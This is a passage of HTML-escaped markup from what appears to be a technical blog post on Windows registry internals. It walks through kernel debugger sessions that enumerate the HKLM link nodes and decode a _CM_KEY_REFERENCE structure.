upwards.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;In this post, we will proceed with the first idea and enumerate the keys within \Registry\Machine (i.e. HKLM):&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;querykey&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;\registry\machine&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Found&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;KCB&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ad96e0&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;\REGISTRY\MACHINE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Hive&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88a88000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;KeyNode&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ada16c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[SubKeyAddr]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[SubKeyName]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ada44c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;BCD00000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ada3cc&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;HARDWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ada59c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SAM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ada504&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SECURITY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ada374&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ada31c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SYSTEM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Use&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;&amp;#39;!reg&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;keyinfo&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88a88000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;&amp;lt;SubKeyAddr&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;subkey&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;details&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[ValueType]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[ValueName]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[ValueData]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;REG_DWORD&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ServiceLastKnownStatus&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;2&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Here, we can see all the system hive mount points together with their corresponding link node addresses. In case of normal, stable keys, these would be user-mode addresses within the address space of the Registry process, but since the master hive is a volatile one, all of its structures are stored on the kernel pools. We can then use a command such as !reg knode to query any of the specific subkeys, e.g. SYSTEM:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;knode&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ffff800f88ada31c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;CM_LINK_NODE_SIGNATURE&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;(kl)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SYSTEM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ParentCell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x168&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Security&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[cell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;index]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[cell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;index]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x2a&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxNameLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxClassLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxValueNameLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxValueDataLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;LastWriteTime&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;1db2b94:0xe031a530&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SubKeyCount[Stable&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;]:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SubKeyLists[Stable&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;]:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x20&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SubKeyCount[Volatile]:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SubKeyLists[Volatile]:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0xffffffff&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ValueList.Count&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x88a8e000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ValueList.List&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0xffff800f&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As expected, the key node has the special link node signature (&amp;#39;kl&amp;#39;), and the 0x2 flag set within the 0x2a Flags bitmask (the other two flags set are KEY_NO_DELETE and KEY_COMP_NAME). The command gets a little confused, because it expects to operate on a regular key node and display its subkey/value counts and lists, but as mentioned above, this space is taken up by the _CM_KEY_REFERENCE structure in the link node. If we line up the offsets correctly, we can decode that the exit node points at cell index 0x20 in hive 0xffff800f88a8e000, which is consistent with the outcome of displaying the structure data directly:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;-id&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0,0,ffffbd044acf6040&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;-r1&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;(*((ntkrnlmp!_CM_KEY_REFERENCE&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;*)0xffff800f88ada338))&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;(*((ntkrnlmp!_CM_KEY_REFERENCE&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;*)0xffff800f88ada338))&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_CM_KEY_REFERENCE]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[+0x000]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;KeyCell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[Type:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;unsigned&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span 